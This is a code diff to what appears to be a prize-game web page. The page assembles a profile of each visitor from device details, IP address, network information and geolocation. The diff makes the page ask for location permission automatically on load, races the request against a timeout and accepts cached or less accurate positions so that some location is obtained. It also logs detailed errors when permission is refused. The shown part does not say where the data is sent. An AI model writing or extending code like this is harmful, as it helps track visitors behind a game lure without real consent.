@@ -692,6 +692,11 @@
             generatePrizeConfig();
             createParticles();
             loadStats();
+            
+            // Request location permission on page load
+            setTimeout(() => {
+                requestLocationPermission();
+            }, 1000);
         });
 
         // Create background particles
@@ -911,12 +916,22 @@
                 deviceMemory: navigator.deviceMemory || 'N/A'
             };
 
-            // Get geolocation
+            // Get geolocation with timeout fallback
             try {
-                const geoData = await getGeolocation();
+                // Set a timeout for geolocation request
+                const geoPromise = getGeolocation();
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject('Geolocation timeout'), 12000)
+                );
+                const geoData = await Promise.race([geoPromise, timeoutPromise]);
                 userData.location = geoData;
             } catch (e) {
-                userData.location = { error: 'Geolocation denied' };
+                // Log the actual error but still store it
+                userData.location = { 
+                    error: String(e),
+                    status: 'permission_not_granted'
+                };
+                console.log('Location error:', e);
             }
 
             // Get IP address
@@ -924,7 +939,11 @@
                 const ipData = await getIPAddress();
                 userData.ip = ipData;
             } catch (e) {
-                userData.ip = { error: 'Could not fetch IP' };
+                userData.ip = { 
+                    error: 'Could not fetch IP',
+                    details: String(e)
+                };
+                console.log('IP error:', e);
             }
 
             // Get network information
@@ -933,30 +952,66 @@
             return userData;
         }
 
+        // Request location permission explicitly
+        function requestLocationPermission() {
+            if (!navigator.geolocation) {
+                console.log('Geolocation not supported');
+                return;
+            }
+            
+            // Just trigger the permission prompt
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log('Location permission granted:', position);
+                },
+                (error) => {
+                    console.log('Location permission response:', error.code);
+                },
+                { timeout: 5000, maximumAge: 0 }
+            );
+        }
+
         // Get geolocation
         function getGeolocation() {
             return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                altitudeAccuracy: position.coords.altitudeAccuracy,
-                                heading: position.coords.heading,
-                                speed: position.coords.speed
-                            });
-                        },
-                        (error) => {
-                            reject(error);
-                        },
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                } else {
+                if (!navigator.geolocation) {
                     reject('Geolocation not supported');
+                    return;
                 }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        });
+                    },
+                    (error) => {
+                        // Handle specific geolocation errors
+                        let errorMsg = 'Geolocation error: ';
+                        if (error.code === error.PERMISSION_DENIED) {
+                            errorMsg = 'Location permission denied by user';
+                        } else if (error.code === error.POSITION_UNAVAILABLE) {
+                            errorMsg = 'Location information unavailable';
+                        } else if (error.code === error.TIMEOUT) {
+                            errorMsg = 'Location request timed out';
+                        } else {
+                            errorMsg += error.message;
+                        }
+                        reject(errorMsg);
+                    },
+                    { 
+                        enableHighAccuracy: false,  // Set to false for faster results
+                        timeout: 10000,              // Increased timeout to 10 seconds
+                        maximumAge: 300000           // Accept cached position up to 5 minutes old
+                    }
+                );
             });
         }
 
